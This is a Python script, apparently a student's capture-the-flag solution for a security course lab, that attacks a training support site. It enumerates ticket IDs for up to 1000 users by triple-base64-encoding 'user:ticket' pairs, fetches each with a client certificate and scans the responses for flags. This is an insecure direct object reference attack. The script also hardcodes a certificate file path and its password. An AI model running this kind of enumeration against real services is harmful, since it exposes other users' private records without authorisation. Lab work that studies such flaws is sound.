from requests_pkcs12 import get
import re
import base64

def triple_decode(encoded_str):
    res1 = base64.b64decode(encoded_str).decode()
    res2 = base64.b64decode(res1.encode()).decode()
    res3 = base64.b64decode(res2.encode()).decode()
    return res3

def triple_encode(decoded_str):
    res1 = base64.b64encode(decoded_str.encode())
    res2 = base64.b64encode(res1)
    res3 = base64.b64encode(res2)
    return res3.decode()

login_url = 'https://support-v3.quoccabank.com/raw/'
p12_path = '/Users/bryanle/Downloads/z5361001.p12'
p12_password = 'Qs3/Keg5W3D/kSJJfp9ltw=='

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Origin': 'https://support.quoccabank.com',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://support.quoccabank.com/new',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
}

interesting_things = []
flag_match = re.compile("COMP{.+z5361001.+}")

user_number = 1
ticket_number = 1
max_user_number = 1000

while user_number <= max_user_number:
    ticket_exists = True
    ticket_number = 1
    while ticket_exists:
        ticket = f"{user_number}:{ticket_number}"
        response = get(
            login_url + triple_encode(ticket),
            headers=headers,
            pkcs12_filename=p12_path,
            pkcs12_password=p12_password
        )
        if "Ticket not found" in response.text:
            ticket_exists = False
            print(f"User {user_number} Ticket {ticket_number} not found, moving to next user.")
        elif flag_match.search(response.text) or 'Flag' in response.text or 'flag' in response.text or 'FLAG' in response.text:
            print("------------------------------------------------------------------------")
            print(f"User {user_number} Ticket {ticket_number} - Something interesting!!")
            print(response.text)
            print("------------------------------------------------------------------------")
            interesting_things.append(f"{user_number}:{ticket_number}")
            break
        else:
            print(f"User {user_number} Ticket {ticket_number} - Nothing interesting")
            print(response.text)
        ticket_number += 1
    user_number += 1

print(f"Interesting things: {interesting_things}")
